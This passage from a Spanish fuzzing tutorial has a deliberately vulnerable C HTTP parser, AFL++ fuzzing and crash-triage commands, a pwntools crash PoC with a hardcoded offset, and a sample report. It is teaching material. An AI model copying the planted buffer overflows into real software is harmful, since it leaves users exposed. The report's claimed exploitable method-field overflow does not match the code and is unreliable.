Laboratorio completo que integra fuzzing con AFL++, triage, analisis, y escritura de PoC.

**Requisitos:**
```bash
# Linux (o WSL2 en Windows)
sudo apt-get install build-essential gdb python3-pip
pip install pwntools ROPgadget

# AFL++ (instrucciones en seccion 3)
```

**Target vulnerable (lab_target.c):**
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void handle_request(char *data, size_t len) {
    char method[16];
    char path[64];
    char version[16];
    char headers[1024];
    
    // Simula un parser [http](../raw/r3d3s-f0nd4m3nt0s.md#http) vulnerable
    if (len < 10) return;
    
    // Parsear metodo
    int i = 0;
    while (i < len && data[i] != ' ' && i < 15) {
        method[i] = data[i];  // Overflow si no hay espacio!
        i++;
    }
    method[i] = '\0';
    i++;  // skip space
    
    // Parsear path
    int j = 0;
    while (i < len && data[i] != ' ' && j < 63) {
        path[j] = data[i];
        i++; j++;
    }
    path[j] = '\0';
    i++;  // skip space
    
    // Parsear version
    j = 0;
    while (i < len && data[i] != '\r' && data[i] != '\n' && j < 15) {
        version[j] = data[i];
        i++; j++;
    }
    version[j] = '\0';
    
    // Vulnerabilidad: procesar path sin validar
    if (strstr(path, "..") != NULL) {
        printf("Path traversal detected!\n");
    }
    
    // Vulnerabilidad: copiar headers sin limite
    if (i < len) {
        i++;  // skip \r or \n
        if (i < len && (data[i] == '\n' || data[i] == '\r')) i++;
        size_t header_len = len - i;
        if (header_len > 0 && header_len < 2048) {
            memcpy(headers, data + i, header_len);  // Potencial overflow
        }
    }
    
    printf("Method: %s | Path: %s | Version: %s\n", method, path, version);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input_file>\n", argv[0]);
        return 1;
    }
    
    FILE *f = fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 1; }
    
    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    char *data = malloc(len + 1);
    fread(data, 1, len, f);
    data[len] = '\0';
    fclose(f);
    
    handle_request(data, len);
    free(data);
    return 0;
}
```

<a name="fuzzing-campaign"></a>
### 10.2 Fuzzing campaign

**Paso 1: Compilar con AFL**
```bash
AFL_USE_ASAN=1 afl-clang-fast -g -o lab_target lab_target.c
```

**Paso 2: Crear corpus inicial**
```bash
mkdir -p lab/input lab/output

# HTTP requests validos
echo -n "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n" > lab/input/get.txt
echo -n "POST /api/login HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"user\":\"admin\"}" > lab/input/post.txt
echo -n "PUT /update?id=1 HTTP/1.1\r\n\r\n" > lab/input/put.txt
echo -n "DELETE /remove HTTP/1.1\r\n\r\n" > lab/input/delete.txt

# Minimizar corpus
afl-cmin -i lab/input -o lab/corpus -- ./lab_target @@
```

**Paso 3: Ejecutar fuzzing**
```bash
# Fuzzing en un solo core
afl-fuzz -i lab/corpus -o lab/output -t 2000 -m 100 -- ./lab_target @@

# Fuzzing multi-core (recomendado)
afl-fuzz -i lab/corpus -o lab/output -M master -- ./lab_target @@ &
afl-fuzz -i lab/corpus -o lab/output -S slave1 -- ./lab_target @@ &
afl-fuzz -i lab/corpus -o lab/output -S slave2 -- ./lab_target @@ &
afl-fuzz -i lab/corpus -o lab/output -S slave3 -- ./lab_target @@ &

# Monitorear
afl-whatsup -s lab/output/
```

<a name="crash-analysis"></a>
### 10.3 Crash analysis

**Paso 4: Analizar crashes**
```bash
mkdir -p lab/analysis

cd lab/output
ls crashes/  # Ver crashes encontrados

# Reproducir crash
./lab_target < crashes/id:000000*

# Con GDB
gdb -batch -ex "run < crashes/id:000000*" -ex "bt 20" -ex "info registers" ./lab_target
```

**Paso 5: Deduplicar**
```bash
#!/bin/bash
cd lab
mkdir -p analysis/{unique,minimized,pocs}

for crash in output/crashes/*; do
    bt=$(gdb -batch -ex "run < $crash" -ex "bt 3" ./lab_target 2>&1)
    hash=$(echo "$bt" | grep "^#" | head -3 | md5sum | cut -d" " -f1)
    
    if [ ! -f "analysis/unique/$hash" ]; then
        cp "$crash" "analysis/unique/$hash.crash"
        echo "New: $hash"
    fi
done

echo "Unique crashes: $(ls analysis/unique/*.crash 2>/dev/null | wc -l)"
```

**Paso 6: Minimizar**
```bash
for crash in analysis/unique/*.crash; do
    name=$(basename "$crash" .crash)
    afl-tmin -i "$crash" -o "analysis/minimized/$name.min" -- ./lab_target @@ 2>/dev/null
done
```

<a name="poc-development"></a>
### 10.4 PoC development

**Paso 7: Desarrollar PoC**

```python
#!/usr/bin/env python3
"""PoC para crash en lab_target"""
from pwn import *
import sys

context.arch = "amd64"
context.log_level = "debug"

def analyze_crash(crash_file):
    """Analiza el crash y determina el offset"""
    io = process(["./lab_target", crash_file])
    io.wait()
    
    # El crash genera core dump o podemos usar GDB en el proceso
    # Para este ejemplo, asumimos offset conocido
    return 72  # offset

def build_poc(offset, target_path):
    """Construye el payload del PoC"""
    
    # Verificar protecciones
    elf = ELF(target_path)
    print(f"[*] Protecciones: {elf.checksec()}")
    
    # Payload basico: control de RIP
    junk = b"A" * offset
    rip = b"B" * 8  # placeholder
    
    payload = junk + rip
    
    # Encontrar badchars (si los hay)
    badchars = [b"\x00", b"\x0a", b"\x0d"]
    for bc in badchars:
        if bc in payload:
            print(f"[!] Badchar {bc.hex()} in payload!")
    
    return payload

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <crash_file>")
        sys.exit(1)
    
    crash_file = sys.argv[1]
    offset = analyze_crash(crash_file)
    print(f"[*] Offset: {offset}")
    
    payload = build_poc(offset, "./lab_target")
    
    # Guardar payload
    with open("poc.bin", "wb") as f:
        f.write(payload)
    print(f"[+] PoC guardado en poc.bin ({len(payload)} bytes)")
    
    # Probar
    print("[*] Probando PoC...")
    io = process(["./lab_target", "poc.bin"])
    io.wait()
    print("[*] PoC ejecutado")
```

<a name="reporte-fuzzing"></a>
### 10.5 Reporte

**Template de reporte de fuzzing campaign:**

```markdown
# Fuzzing Campaign Report

## Target
- Nombre: lab_target ([http](../raw/r3d3s-f0nd4m3nt0s.md#http) parser)
- Version: 1.0
- Compilacion: AFL_USE_ASAN=1 [afl](../raw/fuzz1ng.md#afl)-clang-fast -g -o lab_target lab_target.c

## Campaign
- [fuzzer](../raw/fuzz1ng.md#fuzzer): [afl](../raw/fuzz1ng.md#afl)++
- Duracion: 24 horas
- Cores: 4 (1 master + 3 slaves)
- Corpus inicial: 4 inputs
- [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario): [http](../raw/r3d3s-f0nd4m3nt0s.md#http).dict

## Resultados
- Total paths explorados: 12,456
- Crashes encontrados: 847
- Crashes unicos (dedup): 23
- Coverage alcanzada: 67%

## Crashes Unicos

| ID | Tipo | EIP Control | Explotable | Prioridad |
|-----|------|-------------|------------|-----------|
| 001 | Stack overflow (method) | Si | Si | CRITICAL |
| 002 | Heap overflow (headers) | No | Probable | HIGH |
| 003 | Null dereference | No | No | LOW |

## PoCs Generados
- poc_001.py - EIP control, offset 72
- poc_002.py - Heap corruption (needs more analysis)

## Recomendaciones
1. Validar longitud del metodo antes de copiar
2. Usar strncpy en lugar de memcpy para headers
3. Habilitar stack canary
4. Ejecutar [fuzzing](../raw/fuzz1ng.md) continuo en [ci/cd](../raw/c1cd-h4ck1ng.md)
```

<a name="referencias-fuzzing"></a>
## 11. Referencias

**Herramientas:**
- AFL++: https://github.com/AFLplusplus/AFLplusplus
- LibFuzzer: https://llvm.org/docs/LibFuzzer.html
- Honggfuzz: https://github.com/google/honggfuzz
- pwntools: https://github.com/Gallopsled/pwntools
- ROPgadget: https://github.com/JonathanSalwan/ROPgadget
- crashwalk: https://github.com/bnagy/crashwalk

**Lectura recomendada:**
- "The Fuzzing Book" - https://www.fuzzingbook.org/
- "AFL README" - Michal Zalewski
- "Fuzzing for Software Security" - H. Takabi
- "Practical Binary Analysis" - Dennis Andriesse
- "The Shellcoder's Handbook" - Chris Anley

**Papers:**
- "AFL: american fuzzy lop" - Michal Zalewski
- "Coverage-based Greybox Fuzzing as Markov Chain" - Böhme
- "Fuzzing: A Survey" - Manes et al.
- "LibFuzzer: A Library for Coverage-Guided Fuzz Testing" - LLVM

**Proyectos:**
- OSS-Fuzz: https://github.com/google/oss-fuzz
- ClusterFuzz: https://github.com/google/clusterfuzz
- OneFuzz (Microsoft): https://github.com/microsoft/onefuzz
- syzkaller (kernel): https://github.com/google/syzkaller

**CTFs:**
- https://www.pwn.college/ (fuzzing modules)
- https://ropemporium.com/ (ROP challenges)
- https://exploit.education/ (exploit challenges)
- https://microcorruption.com/ (reverse engineering)

**Canales de YouTube:**
- LiveOverflow (exploit development, fuzzing)
- John Hammond (CTFs, exploit dev)
- GynvaelEN (binary exploitation, fuzzing)
- TsarSec (binary exploitation)

---

*Fin del tutorial Fuzz1ng - Creado por el equipo de Forense*

